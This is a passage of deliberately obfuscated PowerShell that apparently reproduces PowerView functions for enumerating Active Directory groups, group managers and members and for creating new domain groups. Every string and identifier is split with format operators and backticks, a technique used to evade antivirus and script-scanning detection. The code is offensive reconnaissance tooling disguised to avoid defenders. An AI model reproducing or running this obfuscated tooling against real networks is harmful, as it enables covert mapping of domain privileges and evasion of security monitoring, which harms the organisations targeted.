                            ${GrO`UP} = &("{2}{0}{3}{1}" -f 'D','inObject','Get-','oma') @SearcherArguments
                            if (${G`R`OUP}) {
                                ${grO`Up}."P`S`oBjEcT"."t`YPEn`AMES".("{2}{0}{1}"-f'nser','t','I').Invoke(0, ("{3}{2}{1}{4}{0}" -f'oup','rVi','we','Po','ew.Gr'))
                                ${G`RoUp}
                            }
                        }
                    }
                }
            }
            else {
                ${ID`eNtITYfIlt`ER} = ''
                ${FiLt`ER} = ''
                ${IDeN`T`ity} | &("{3}{2}{0}{1}" -f 'e-Objec','t','r','Whe') {${_}} | &("{0}{2}{1}"-f'For','t','Each-Objec') {
                    ${IDE`NT`ITy`in`STAnCE} = ${_}.("{0}{1}"-f 'Re','place').Invoke('(', '\28').("{0}{1}"-f 'R','eplace').Invoke(')', '\29')
                    if (${iD`e`N`TiT`yinStaN`cE} -match ("{0}{1}" -f '^S-1','-')) {
                        ${ID`EntIT`y`FIL`Ter} += "(objectsid=$IdentityInstance)"
                    }
                    elseif (${IdEnTi`TYinsta`N`CE} -match ("{0}{1}"-f'^CN','=')) {
                        ${I`dEN`TItYFIlT`ER} += "(distinguishedname=$IdentityInstance)"
                        if ((-not ${pS`BOunD`PArAM`eTe`RS}[("{1}{0}" -f 'main','Do')]) -and (-not ${PsB`OunDp`AraMEt`Ers}[("{0}{2}{1}{3}"-f'Sear','s','chBa','e')])) {
                            
                            
                            ${IDE`N`TI`TYDoma`in} = ${IDeN`TI`TYiNs`TaNCe}.("{1}{2}{0}" -f'ng','SubSt','ri').Invoke(${i`DE`NtIty`insTanCE}.("{0}{1}" -f'Ind','exOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                            &("{0}{4}{3}{2}{1}"-f 'Write-V','se','o','b','er') ('[Ge'+'t-D'+'oma'+'inGro'+'up] '+'Ex'+'t'+'racted '+'do'+'main'+' '+"'$IdentityDomain' "+'f'+'rom '+"'$IdentityInstance'")
                            ${sEa`R`CheR`ARg`UmEn`Ts}[("{0}{1}"-f 'Domai','n')] = ${I`dEnTity`DOmAIn}
                            ${g`R`OUPsE`ARCHer} = &("{3}{0}{1}{2}"-f'DomainS','ea','rcher','Get-') @SearcherArguments
                            if (-not ${Gr`OU`PSeARCHeR}) {
                                &("{1}{0}{2}" -f'rite-W','W','arning') ('['+'Get-D'+'omai'+'nGrou'+'p] '+'U'+'nabl'+'e '+'to'+' '+'ret'+'r'+'ieve '+'domain'+' '+'sear'+'che'+'r '+'fo'+'r '+"'$IdentityDomain'")
                            }
                        }
                    }
                    elseif (${iDe`Nt`IT`Y`in`sTaNCE} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        ${G`UID`BYTe`sTRiNg} = (([Guid]${IdENT`It`Yin`S`TANCE}).("{2}{0}{1}"-f 'a','y','ToByteArr').Invoke() | &("{0}{2}{1}" -f 'ForEac','Object','h-') { '\' + ${_}.("{1}{0}{2}" -f 'i','ToStr','ng').Invoke('X2') }) -join ''
                        ${i`DE`NtiTY`FILT`eR} += "(objectguid=$GuidByteString)"
                    }
                    elseif (${I`dE`N`TIt`yIN`stanCe}.("{1}{0}" -f 'ns','Contai').Invoke('\')) {
                        ${co`NVErtED`IDEntITy`i`NStANcE} = ${iDe`NTi`T`yins`TA`NCE}.("{0}{2}{1}" -f 'R','e','eplac').Invoke('\28', '(').("{1}{0}"-f'eplace','R').Invoke('\29', ')') | &("{2}{0}{4}{3}{1}" -f'nvert','e','Co','am','-ADN') -OutputType ("{1}{2}{0}"-f 'cal','Can','oni')
                        if (${C`ONV`ERTedi`DEntityI`N`stAnCE}) {
                            ${gRoU`PdO`Main} = ${C`on`VErteD`i`DEnTit`YInstance}.("{0}{1}{2}"-f 'Sub','Strin','g').Invoke(0, ${C`onVe`RtEd`idenT`ItYIn`stance}.("{0}{2}{1}"-f 'Ind','Of','ex').Invoke('/'))
                            ${gRO`Up`NAME} = ${I`DeN`TItyin`s`TAnCe}.("{1}{0}" -f'lit','Sp').Invoke('\')[1]
                            ${I`dEN`TItY`F`Ilter} += "(samAccountName=$GroupName)"
                            ${SeA`R`CH`eRAR`GUments}[("{0}{1}" -f'D','omain')] = ${Gro`U`Pdo`MaiN}
                            &("{0}{2}{1}{3}"-f'W','e','rit','-Verbose') ('[Get-Dom'+'ainG'+'ro'+'up] '+'Ex'+'tra'+'cted'+' '+'do'+'main '+"'$GroupDomain' "+'fr'+'om '+"'$IdentityInstance'")
                            ${G`Ro`UPSEa`RC`heR} = &("{3}{0}{1}{2}"-f 't-Do','mai','nSearcher','Ge') @SearcherArguments
                        }
                    }
                    else {
                        ${i`dEn`TitYfIL`TER} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance))"
                    }
                }

                if (${iD`e`NtITYFI`lteR} -and (${IDen`T`I`Ty`FIlTER}.("{0}{1}"-f'Tri','m').Invoke() -ne '') ) {
                    ${f`i`LtER} += "(|$IdentityFilter)"
                }

                if (${psboUN`d`PAraMET`E`RS}[("{0}{1}{2}" -f 'Admin','Co','unt')]) {
                    &("{3}{2}{4}{0}{1}"-f 's','e','te','Wri','-Verbo') ("{0}{1}{2}{4}{3}{6}{9}{5}{8}{7}" -f '[','Get','-DomainG','Sear','roup] ','r ad','c','Count=1','min','hing fo')
                    ${f`ILTeR} += ("{2}{0}{1}{4}{3}" -f'ncoun','t','(admi','1)','=')
                }
                if (${PsbOU`N`dp`ArA`MEtErS}[("{0}{1}{2}"-f 'G','rou','pScope')]) {
                    ${gro`Ups`Cope`V`Alue} = ${pSbou`ND`pArAM`etERs}[("{2}{1}{3}{0}" -f 'ope','rou','G','pSc')]
                    ${FIl`TER} = Switch (${G`Rou`PScO`Pe`V`ALUE}) {
                        ("{1}{0}{2}" -f 'ainLoca','Dom','l')       { (("{2}{7}{3}{6}{4}{0}{8}{5}{1}" -f'.803:',')','(gro','2.840.113','4','4','556.1.','upType:1.','=')) }
                        ("{2}{0}{1}{3}"-f'o','mainLoca','NotD','l')    { ("{0}{1}{6}{4}{7}{2}{3}{8}{5}{9}" -f'(!','(grou','556','.','1.2.840.',')','pType:','113','1.4.803:=4',')') }
                        ("{0}{1}"-f 'Globa','l')            { ("{3}{2}{6}{5}{0}{4}{1}{7}"-f '.11','56.1.4.','oupTy','(gr','35','1.2.840','pe:','803:=2)') }
                        ("{0}{2}{1}" -f'NotG','al','lob')         { ((("{8}{10}{11}{9}{5}{6}{1}{4}{3}{7}{2}{0}"-f'))','.1135','=2','03','56.1.4.8','1.2.8','40',':','(!(',':','gro','upType'))) }
                        ("{2}{3}{1}{0}" -f 'rsal','e','Uni','v')         { (("{1}{3}{6}{2}{5}{4}{0}" -f '3:=8)','(gr','.840.','oupTyp','56.1.4.80','1135','e:1.2')) }
                        ("{3}{0}{1}{2}"-f 'otU','n','iversal','N')      { ((("{6}{1}{4}{5}{0}{3}{2}" -f'556.1.4.80','upType:1.2.',')','3:=8)','840.1','13','(!(gro'))) }
                    }
                    &("{1}{2}{0}"-f'e','Write-','Verbos') ('[Get-Do'+'m'+'ain'+'Gr'+'oup] '+'Se'+'archin'+'g '+'f'+'or '+'gr'+'oup'+' '+'scope'+' '+"'$GroupScopeValue'")
                }
                if (${Psbo`UndPARAMET`e`Rs}[("{2}{3}{0}{1}"-f 'p','erty','Gro','upPro')]) {
                    ${gr`ouppRoPeR`TY`VAluE} = ${PsB`ouNDp`AR`Am`ETERS}[("{3}{2}{4}{1}{0}" -f'erty','p','ou','Gr','pPro')]
                    ${F`Ilter} = Switch (${GroupP`R`oP`ERtYVa`luE}) {
                        ("{1}{2}{0}"-f'y','Sec','urit')              { ("{1}{0}{2}{3}{10}{8}{5}{4}{11}{9}{7}{6}" -f'up','(gro','Type',':1.','1.4.803:','0.113556.',')','3648','.84','8','2','=21474') }
                        ("{0}{1}{2}"-f'D','ist','ribution')          { ("{3}{8}{5}{4}{6}{2}{1}{0}{7}" -f ':=21','556.1.4.803','.113','(!(gro',':1','Type','.2.840','47483648))','up') }
                        ("{1}{4}{3}{2}{0}"-f 'm','Cr','e','edBySyst','eat')       { ("{2}{3}{5}{1}{6}{0}{4}" -f '=1','.1.4.8','(groupTyp','e:1.2.84',')','0.113556','03:') }
                        ("{3}{2}{0}{1}{4}"-f 'tCreat','edBySyste','o','N','m')    { (("{0}{7}{6}{9}{11}{3}{1}{8}{2}{10}{4}{5}" -f'(','6.1','8','355','3:','=1))','up','!(gro','.4.','Type:1.2.','0','840.11')) }
                    }
                    &("{3}{1}{0}{2}"-f 'V','-','erbose','Write') ('[G'+'et-'+'DomainGr'+'o'+'up] '+'Searc'+'hin'+'g '+'f'+'or '+'gr'+'oup '+'proper'+'ty'+' '+"'$GroupPropertyValue'")
                }
                if (${PSboUnD`P`Ara`mETERs}[("{3}{1}{0}{2}"-f 'te','il','r','LDAPF')]) {
                    &("{0}{1}{2}{3}" -f'Wr','it','e','-Verbose') ('[Ge'+'t-'+'D'+'om'+'ainGroup] '+'U'+'sin'+'g '+'add'+'itional'+' '+'LD'+'AP '+'filt'+'er:'+' '+"$LDAPFilter")
                    ${Fi`LT`eR} += "$LDAPFilter"
                }

                ${GrouPs`EA`R`c`hER}."filT`ER" = "(&(objectCategory=group)$Filter)"
                &("{1}{3}{2}{0}" -f 'ose','Write','b','-Ver') "[Get-DomainGroup] filter string: $($GroupSearcher.filter) "

                if (${psbounDP`AR`AM`ETE`RS}[("{2}{0}{1}" -f'ind','One','F')]) { ${rEsUl`TS} = ${gRO`UpS`eArCHEr}.("{1}{0}"-f 'indOne','F').Invoke() }
                else { ${RES`UL`Ts} = ${grOUPS`E`ARch`er}.("{2}{0}{1}" -f 'A','ll','Find').Invoke() }
                ${r`EsuLTS} | &("{0}{1}{2}{3}"-f 'Wher','e-','O','bject') {${_}} | &("{2}{1}{0}" -f 'ect','Each-Obj','For') {
                    if (${pSB`OUnDpa`RAM`E`TE`RS}['Raw']) {
                        
                        ${G`R`Oup} = ${_}
                    }
                    else {
                        ${Gr`OuP} = &("{3}{5}{0}{1}{4}{2}"-f'rt-L','DAPPrope','y','C','rt','onve') -Properties ${_}."PR`o`Pe`RTIES"
                    }
                    ${Gr`OUp}."pso`B`JEcT"."tYp`eN`AMes".("{1}{0}"-f 't','Inser').Invoke(0, ("{2}{3}{4}{1}{0}" -f'up','w.Gro','P','owerVi','e'))
                    ${GrO`Up}
                }
                if (${r`eSu`LTs}) {
                    try { ${R`ESu`lTS}.("{1}{0}"-f 'ispose','d').Invoke() }
                    catch {
                        &("{2}{1}{0}{3}" -f 'V','rite-','W','erbose') ("{13}{16}{0}{1}{4}{3}{6}{15}{9}{2}{10}{14}{5}{8}{12}{11}{7}"-f 'Doma','i','po','Group','n',' ','] Error','ect','the Resul','is','sin','s obj','t','[G','g of',' d','et-')
                    }
                }
                ${gr`OupSeaRc`HEr}.("{1}{0}"-f 'ispose','d').Invoke()
            }
        }
    }
}


function NeW-`doMaINgro`UP {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{8}{9}{4}{1}{5}{3}{7}{0}{6}{2}"-f 'gingF','roc','nctions','State','seShouldP','essFor','u','Chan','PS','U'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{1}{3}" -f 'PS','roces','ShouldP','s'}, '')]
    [OutputType({"{5}{0}{8}{10}{1}{7}{6}{2}{4}{11}{3}{9}" -f 'irectorySer','Accoun','gement','rincip','.Grou','D','na','tMa','vices','al','.','pP'})]
    Param(
        [Parameter(MaNdatory = ${Tr`Ue})]
        [ValidateLength(0, 256)]
        [String]
        ${sAMAcc`oUntN`AMe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${N`AME},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`Is`Pla`ynaMe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${deScript`I`on},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Doma`In},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`R`edeN`Tial} =  (GEt-ChilDITEm ('Va'+'Ri'+'abLe:Q'+'FN')  )."val`Ue"::"E`mPTY"
    )

    ${Co`NteXT`Ar`G`U`mENts} = @{
        ("{1}{0}{2}" -f'enti','Id','ty') = ${sa`maccoU`N`TNaME}
    }
    if (${pSBo`UnDP`ArA`mETErS}[("{1}{0}" -f'n','Domai')]) { ${CO`NT`e`xTA`R`GUMeNTs}[("{1}{0}" -f'omain','D')] = ${do`m`AiN} }
    if (${PS`BOu`N`DPArAMeTErs}[("{2}{0}{1}"-f'e','dential','Cr')]) { ${cO`N`Tex`TaRGUmenTs}[("{1}{2}{0}"-f 'tial','Cr','eden')] = ${Cr`e`D`ENtIal} }
    ${cO`N`TeXT} = &("{0}{2}{5}{3}{4}{1}"-f 'G','t','et-P','p','alContex','rinci') @ContextArguments

    if (${Co`NtE`xt}) {
        ${Gr`ouP} = &("{2}{1}{0}" -f't','ec','New-Obj') -TypeName ("{0}{5}{2}{1}{7}{8}{11}{10}{9}{13}{4}{3}{12}{15}{14}{6}" -f 'Sy','m.Directo','te','rou','ent.G','s','pal','ryServices.','A','u','co','c','pPr','ntManagem','ci','in') -ArgumentList (${co`NTe`xt}."coNT`EXt")

        
        ${g`RO`UP}."sa`M`ACcOuntna`Me" = ${co`N`Text}."id`enti`TY"

        if (${PSBO`U`NDPA`RAmETeRS}[("{0}{1}" -f 'N','ame')]) {
            ${G`R`Oup}."nA`mE" = ${NA`Me}
        }
        else {
            ${g`ROup}."n`AMe" = ${CO`NTe`Xt}."I`d`entitY"
        }
        if (${PsBou`NDp`A`RA`MeTErS}[("{1}{0}{2}"-f'is','D','playName')]) {
            ${GrO`Up}."Di`sP`laYNaME" = ${DiSp`La`YnaMe}
        }
        else {
            ${GR`OuP}."dIS`PlaY`NamE" = ${coN`Te`xT}."iDENt`i`TY"
        }

        if (${P`SBoUndpA`R`AMETErs}[("{1}{0}{2}"-f 'scri','De','ption')]) {
            ${g`R`ouP}."des`cR`IPTiON" = ${D`EscR`Ipt`ioN}
        }

        &("{0}{3}{2}{1}" -f 'Write','bose','r','-Ve') ('[New'+'-'+'Do'+'mai'+'nG'+'roup] '+'A'+'tte'+'mp'+'ting '+'t'+'o '+'cr'+'e'+'ate '+'g'+'roup '+"'$SamAccountName'")
        try {
            ${nU`lL} = ${GrO`Up}.("{1}{0}"-f 'ave','S').Invoke()
            &("{1}{0}{3}{2}" -f'Ve','Write-','se','rbo') ('[New-'+'Do'+'ma'+'inG'+'ro'+'up] '+'Gro'+'up '+"'$SamAccountName' "+'successfu'+'l'+'l'+'y'+' '+'cre'+'ated')
            ${GRo`Up}
        }
        catch {
            &("{0}{2}{1}" -f 'Wri','Warning','te-') ('[New-Do'+'m'+'a'+'in'+'Group] '+'Er'+'ror '+'cre'+'a'+'ting '+'gr'+'oup '+"'$SamAccountName' "+': '+"$_")
        }
    }
}


function G`e`T-d`OMa`i`NmA`NAGEDSe`CURiTyGRouP {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{2}" -f 'dProces','PSShoul','s'}, '')]
    [OutputType({"{8}{3}{9}{0}{2}{5}{4}{7}{6}{1}"-f 'Manag','p','edS','e','cu','e','u','rityGro','Pow','rView.'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSItION = 0, ValueFrOmPIPelIne = ${T`RUe}, ValuEfROmpiPeLINEBYprOPErtYnaMe = ${TR`UE})]
        [Alias({"{0}{1}" -f 'N','ame'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${D`OmAiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f'SPat','AD','h'})]
        [String]
        ${SEaRc`H`BAse},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{3}{1}" -f'DomainCo','er','n','troll'})]
        [String]
        ${Se`RvEr},

        [ValidateSet({"{1}{0}"-f 'ase','B'}, {"{0}{1}{2}"-f 'OneL','eve','l'}, {"{1}{2}{0}"-f'e','Subtr','e'})]
        [String]
        ${S`EaR`chsCOPe} = ("{0}{1}" -f'S','ubtree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${reS`UlTp`AGESizE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seR`V`ERTI`meL`imiT},

        [Switch]
        ${TOm`Bst`ONe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`RE`D`enTiAl} =  (VAriable  ("{1}{0}"-f'Fn','q') -vAlueOnly  )::"eM`pty"
    )

    BEGIN {
        ${seaRcH`e`Ra`R`GUmentS} = @{
            ("{0}{2}{1}"-f'LDAP','r','Filte') = (("{12}{7}{9}{2}{3}{5}{4}{6}{10}{0}{8}{1}{11}{13}" -f'03:=2','83','gedBy=*)(gr','ou','e:1.2.840.1','pTyp','1355','a','1474','na','6.1.4.8','648)','(&(m',')'))
            ("{2}{1}{0}"-f'es','perti','Pro') = ("{0}{11}{3}{8}{13}{2}{12}{1}{5}{10}{7}{9}{4}{6}" -f'd','u','agedBy,samac','stingu','tnam','nttype,sa','e','c','i','coun','ma','i','co','shedName,man')
        }
        if (${psBOunDP`A`R`AmETE`Rs}[("{0}{2}{1}" -f 'S','hBase','earc')]) { ${s`eA`R`cHErArG`UMEnts}[("{2}{0}{1}" -f 'earc','hBase','S')] = ${seaRCh`B`Ase} }
        if (${pSbOu`NDp`AR`AmE`TERS}[("{1}{0}" -f'ver','Ser')]) { ${SeaRCh`eR`ArGum`EntS}[("{2}{0}{1}" -f've','r','Ser')] = ${SE`Rv`Er} }
        if (${PSboUnDP`AraM`eTE`RS}[("{2}{0}{1}" -f 'op','e','SearchSc')]) { ${s`eAr`cHER`A`RG`UMENtS}[("{2}{3}{0}{1}"-f 'hS','cope','Sea','rc')] = ${Se`ArChSCo`pe} }
        if (${Psbo`Un`D`pARa`MEtERs}[("{0}{1}{3}{2}"-f 'Res','ultPag','ze','eSi')]) { ${s`EArC`hErARG`UmenTs}[("{0}{1}{4}{3}{2}"-f 'R','es','ize','ltPageS','u')] = ${rES`U`lTp`AgesIze} }
        if (${pS`B`O`UndpAra`m`etErS}[("{0}{3}{1}{2}" -f'Se','imeLimi','t','rverT')]) { ${Se`ARCHEra`RG`UmENtS}[("{4}{1}{0}{2}{3}"-f 'i','verT','meLim','it','Ser')] = ${SErv`eRTI`M`EL`imiT} }
        if (${P`sBo`UNdPaRametE`Rs}[("{2}{1}{0}" -f'yMasks','it','Secur')]) { ${Sea`R`CH`er`Argu`MEnTS}[("{0}{2}{3}{1}{4}" -f'Se','M','c','urity','asks')] = ${se`c`U`RiTyMaS`ks} }
        if (${PSBo`UNDPArA`m`EterS}[("{1}{2}{0}"-f'bstone','To','m')]) { ${searcHE`RaRGum`En`TS}[("{1}{3}{2}{0}"-f 'ne','Tomb','o','st')] = ${To`m`B`StOne} }
        if (${pS`Boun`d`pARa`M`eters}[("{0}{2}{1}"-f'Creden','ial','t')]) { ${SeAr`Ch`eRarGUmEN`TS}[("{0}{1}{2}" -f'Cre','dentia','l')] = ${C`RedE`Nt`IaL} }
    }

    PROCESS {
        if (${psBoU`NDpa`Ra`Met`erS}[("{1}{0}{2}"-f'm','Do','ain')]) {
            ${sEAr`c`hERa`Rg`UmENtS}[("{1}{2}{0}"-f'in','Dom','a')] = ${Do`MAiN}
            ${TA`RG`E`T`DoMAIn} = ${DO`Ma`In}
        }
        else {
            ${t`ArGeTdOMA`IN} = ${eNV:us`e`R`DNS`Do`MAiN}
        }

        
        &("{3}{1}{2}{0}" -f'up','et-DomainG','ro','G') @SearcherArguments | &("{3}{2}{0}{1}" -f 'ch-','Object','orEa','F') {
            ${S`EaRCheR`ArGUmE`N`Ts}[("{1}{2}{0}" -f 's','Proper','tie')] = ("{8}{1}{11}{9}{12}{6}{5}{4}{10}{7}{3}{2}{0}"-f 'tsid','ishedna','c','e,obje','o','samacc','counttype,','m','distingu',',name,sa','untna','me','mac')
            ${s`EARch`er`A`RgUmEnTs}[("{2}{0}{1}" -f't','ity','Iden')] = ${_}."manAge`DBY"
            ${NU`LL} = ${SEARc`HE`R`A`RGUMENtS}.("{1}{0}"-f've','Remo').Invoke(("{2}{1}{0}"-f'er','lt','LDAPFi'))

            
            
            ${GRo`UpMA`NaG`ER} = &("{0}{4}{1}{2}{3}" -f 'Get','ainOb','jec','t','-Dom') @SearcherArguments
            
            ${MANa`GedGR`oUP} = &("{3}{2}{0}{1}" -f '-O','bject','w','Ne') ("{2}{1}{0}"-f 't','jec','PSOb')
            ${Ma`NA`g`eDGRo`Up} | &("{3}{2}{1}{0}" -f 'mber','e','M','Add-') ("{2}{0}{3}{1}" -f'r','perty','Notep','o') ("{0}{2}{3}{1}" -f 'G','pName','ro','u') ${_}."SAmA`cco`UNtn`AME"
            ${M`ANa`gEDg`ROUp} | &("{3}{1}{2}{0}" -f'mber','d-M','e','Ad') ("{0}{1}{2}{3}"-f'No','tep','r','operty') ("{3}{1}{2}{5}{0}{4}"-f 'tinguished','upD','i','Gro','Name','s') ${_}."d`i`STI`NgUishe`DnAme"
            ${ManAG`ed`gr`OUp} | &("{0}{1}{2}"-f 'Ad','d-Me','mber') ("{2}{3}{0}{1}" -f'p','erty','No','tepro') ("{2}{0}{1}"-f'ag','erName','Man') ${GrOU`pMANaG`Er}."sam`AC`cOU`NtNAmE"
            ${mAnAGEd`Gr`ouP} | &("{0}{2}{1}"-f 'Add-','r','Membe') ("{2}{1}{0}"-f'erty','prop','Note') ("{1}{0}{5}{4}{3}{2}" -f 'n','Ma','inguishedName','ist','gerD','a') ${gr`o`UP`MAnAg`eR}."diSTIn`GUi`ShedN`AME"

            
            if (${GR`oUPMaNAg`ER}."S`AMa`C`Cou`NTType" -eq 0x10000000) {
                ${Ma`NAGE`DgR`OuP} | &("{1}{2}{0}{3}" -f 'embe','Add','-M','r') ("{0}{2}{1}"-f'Noteprop','y','ert') ("{0}{1}{2}" -f'M','ana','gerType') ("{0}{1}" -f 'Grou','p')
            }
            elseif (${gR`oU`P`mAnagER}."S`A`MACC`o`UNtTYPE" -eq 0x30000000) {
                ${MANa`GedGR`O`Up} | &("{0}{1}{2}"-f'Add-M','emb','er') ("{1}{0}{2}{3}"-f 'tep','No','rope','rty') ("{0}{3}{1}{2}"-f 'M','er','Type','anag') ("{1}{0}"-f'ser','U')
            }

            ${aC`La`RguMEnts} = @{
                ("{0}{1}" -f'I','dentity') = ${_}."d`ISTINg`UISh`eDnAME"
                ("{3}{1}{2}{0}"-f 'lter','htsF','i','Rig') = ("{3}{0}{2}{1}"-f 'iteMembe','s','r','Wr')
            }
            if (${Ps`BO`UnDPA`RAmETE`RS}[("{1}{2}{0}" -f 'ver','Se','r')]) { ${a`CLA`Rgu`men`Ts}[("{0}{1}" -f'Serve','r')] = ${s`ERV`er} }
            if (${psBOU`ND`pa`RAmETeRs}[("{0}{1}{2}" -f 'S','earchScop','e')]) { ${acL`ARguM`e`NtS}[("{2}{1}{0}" -f 'cope','rchS','Sea')] = ${seA`R`chSCOpE} }
            if (${Psb`OuND`P`A`RAME`TeRS}[("{2}{1}{3}{0}" -f'e','esultPag','R','eSiz')]) { ${a`c`LArG`UMEnTs}[("{3}{0}{1}{4}{2}" -f'ltPa','g','Size','Resu','e')] = ${rE`Su`LTPA`gES`iZE} }
            if (${P`sBO`UNDPA`RAm`eTerS}[("{1}{3}{4}{0}{2}"-f'm','Ser','it','verTime','Li')]) { ${aclarg`U`mEN`TS}[("{0}{1}{2}{3}"-f'Server','Time','Lim','it')] = ${SeRVe`R`T`iME`limit} }
            if (${PsBo`Undp`AR`Am`ETErs}[("{0}{1}{2}"-f'To','mb','stone')]) { ${Ac`la`Rg`UMENTs}[("{2}{1}{0}" -f'tone','ombs','T')] = ${To`MbSTo`Ne} }
            if (${PSB`O`UndpA`R`AmEtE`RS}[("{2}{1}{0}" -f'al','denti','Cre')]) { ${A`C`lAR`GuMen`Ts}[("{1}{2}{0}" -f'ial','Cr','edent')] = ${Cre`DE`N`TIAL} }

            
            
            
            
            
            
            
            
            
            
            

            ${Ma`NAG`Ed`grOuP} | &("{1}{2}{0}"-f 'ber','A','dd-Mem') ("{1}{0}{2}" -f'ope','Notepr','rty') ("{3}{1}{4}{2}{0}"-f 'nWrite','anage','Ca','M','r') ("{0}{1}"-f'UNK','NOWN')

            ${M`ANAGEDg`R`O`UP}."p`SObje`CT"."Ty`p`ENAmeS".("{0}{1}" -f'I','nsert').Invoke(0, ("{3}{0}{1}{2}{4}{5}"-f 'e','w.Ma','nagedSe','PowerVi','curit','yGroup'))
            ${manA`gedGr`o`UP}
        }
    }
}


function g`Et`-DomAInGR`oupmem`B`Er {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{4}{0}{3}{1}" -f'roc','ss','P','e','SShouldP'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{8}{4}{6}{3}{7}{2}{5}{1}"-f 'PSUseDeclaredVa','nts','n','Th','sM','me','ore','anAssig','r'}, '')]
    [OutputType({"{6}{4}{5}{1}{3}{0}{2}" -f 'em','u','ber','pM','erVi','ew.Gro','Pow'})]
    [CmdletBinding(defAUltpArAmeTerSETNaMe = {"{1}{0}"-f'e','Non'})]
    Param(
        [Parameter(POSiTiON = 0, MAndATORY = ${T`RUe}, VaLUefrOmpIPeline = ${TR`Ue}, ValUEFROMPIpeLinebyPrOpERtynAmE = ${t`RUE})]
        [Alias({"{0}{1}{2}{3}" -f'D','istin','guishedNam','e'}, {"{1}{0}{2}{3}" -f'Acco','Sam','untN','ame'}, {"{1}{0}" -f 'e','Nam'}, {"{3}{6}{0}{2}{4}{5}{1}"-f 'inguis','me','he','Memb','dN','a','erDist'}, {"{2}{1}{3}{0}" -f 'erName','m','Me','b'})]
        [String[]]
        ${iD`e`NTi`TY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`o`mAIN},

        [Parameter(ParamEtersETnAMe = "MaNu`A`Lre`c`Urse")]
        [Switch]
        ${R`EcuRSE},

        [Parameter(paRAMEtErsEtnaME = "R`e`cuRse`U`SIngMa`TChINgr`UlE")]
        [Switch]
        ${rEcUR`Se`USin`gMa`T`ChIN`grUlE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'r','Filte'})]
        [String]
        ${Ld`APfi`L`TER},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}" -f 'S','Path','AD'})]
        [String]
        ${sE`A`R`ChBASE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{4}{0}{3}" -f 'tr','ma','Do','oller','inCon'})]
        [String]
        ${Se`RVER},

        [ValidateSet({"{0}{1}" -f 'Bas','e'}, {"{0}{1}{2}" -f 'OneL','ev','el'}, {"{0}{1}"-f'S','ubtree'})]
        [String]
        ${S`EAR`Ch`ScOpE} = ("{0}{1}" -f 'Su','btree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rE`S`UltPaG`E`SIZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`Er`Ve`RTiMEliMIT},

        [ValidateSet({"{1}{0}" -f'l','Dac'}, {"{1}{0}"-f'up','Gro'}, {"{1}{0}" -f'ne','No'}, {"{0}{1}" -f 'O','wner'}, {"{0}{1}"-f'Sa','cl'})]
        [String]
        ${secu`RI`TY`MASkS},

        [Switch]
        ${toM`BStO`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRE`Den`TiAl} =   (get-childiTeM ('V'+'arIABL'+'e'+':QFN') )."v`AlUe"::"EM`pty"
    )

    BEGIN {
        ${SeARCH`ERarg`U`m`enTs} = @{
            ("{1}{2}{0}" -f's','Pr','opertie') = ("{3}{1}{6}{5}{2}{7}{8}{0}{4}{9}" -f'istin','ember,sam','ntna','m','gui','cou','ac','me,','d','shedname')
        }
        if (${psBouNd`P`ARA`met`erS}[("{0}{1}" -f'Dom','ain')]) { ${sEA`RcHerar`GUmEn`Ts}[("{0}{1}{2}" -f 'Doma','i','n')] = ${dO`mAIN} }
        if (${p`S`B`OUNDPA`Ra`MEtErs}[("{2}{0}{1}" -f'PFilte','r','LDA')]) { ${SeArc`hER`AR`gumEN`TS}[("{1}{3}{2}{0}"-f 'ilter','LD','PF','A')] = ${lDA`PfI`LT`er} }
        if (${psBoU`N`D`P`A`RAmETERS}[("{2}{0}{1}" -f 'earchB','ase','S')]) { ${se`Ar`chE`RarGuMEn`Ts}[("{1}{3}{0}{2}" -f 'as','Search','e','B')] = ${Se`AR`cH`Base} }
        if (${PsBO`Un`dParaM`ETERs}[("{1}{0}"-f 'ver','Ser')]) { ${S`E`Arche`RArg`UMenTs}[("{1}{0}{2}" -f 'rve','Se','r')] = ${s`eRvEr} }
        if (${ps`B`o`UND`pAraM`eTeRs}[("{2}{1}{0}"-f 'pe','co','SearchS')]) { ${S`E`ARCHer`Ar`guM`enTS}[("{0}{2}{1}"-f'Searc','cope','hS')] = ${Se`AR`ChscoPE} }
        if (${pSbO`UndPARAmeT`E`Rs}[("{2}{1}{0}" -f 'ize','ageS','ResultP')]) { ${se`Ar`CHErA`RGume`Nts}[("{0}{3}{2}{1}" -f'ResultPa','ze','i','geS')] = ${ResUL`T`p`AGEsizE} }
        if (${PSbO`U`NDpara`m`eTers}[("{4}{1}{2}{0}{3}" -f 'e','erv','erTim','Limit','S')]) { ${s`ea`RcHErarGuMe`NTs}[("{4}{1}{2}{3}{0}" -f 'mit','rv','er','TimeLi','Se')] = ${Se`Rv`E`RtImeLImit} }
